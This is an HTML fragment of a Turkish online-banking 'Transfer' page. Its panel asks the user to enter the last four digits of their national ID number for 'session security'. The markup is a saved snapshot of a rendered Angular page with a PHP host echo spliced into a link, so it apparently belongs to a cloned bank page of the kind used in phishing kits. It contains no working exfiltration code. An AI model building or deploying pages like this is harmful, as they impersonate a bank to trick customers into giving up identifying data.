<main>
    <router-outlet></router-outlet>
    <app-dashboard class="ng-star-inserted">
        <router-outlet></router-outlet>
        <transfer class="ng-star-inserted">
            <div class="breadcrumb-wrapper flex-container">
                <div class="breadcrumbs-cont flex-container flex-item">
                    <history-back-button><a class="breadcrumb" href="<?= $_SERVER['HTTP_HOST'] ?>"><i class="icon chevron-right pg-icons"></i></a></history-back-button><a class="breadcrumb" href="javascript:;">Transfer</a>
                </div>
            </div>
            <!---->
            <!---->
            <tckn-verification class="ng-star-inserted">
                <div class="modul-accordion">
                    <div class="modul-header"><span class="header-text"> Oturum Güvenliği Kimlik Numarası Kontrolü </span></div>
                    <div class="modul-content">
                        <div class="tckn-vrfctn">
                            <p>Güvenlik gereği bu işlemi gerçekleştirebilmek için TC Kimlik Numaranızın son 4 hanesini girmeniz gerekmektedir.</p>
                            <form novalidate="" class="ng-untouched ng-pristine ng-invalid"><input class="browser-default ng-untouched ng-pristine ng-invalid" id="tckn" name="tckn" pattern="^[0-9]+$" required="" type="password" placeholder="TC Kimlik No Son 4 Hanesini giriniz" minlength="4" maxlength="4">
                                <!---->
                                <div class="input-field"><button class="btn" disabled="">Gönder</button></div>
                            </form>
                        </div>
                    </div>
                </div>
            </tckn-verification>
            <!---->
        </transfer>
    </app-dashboard>
</main>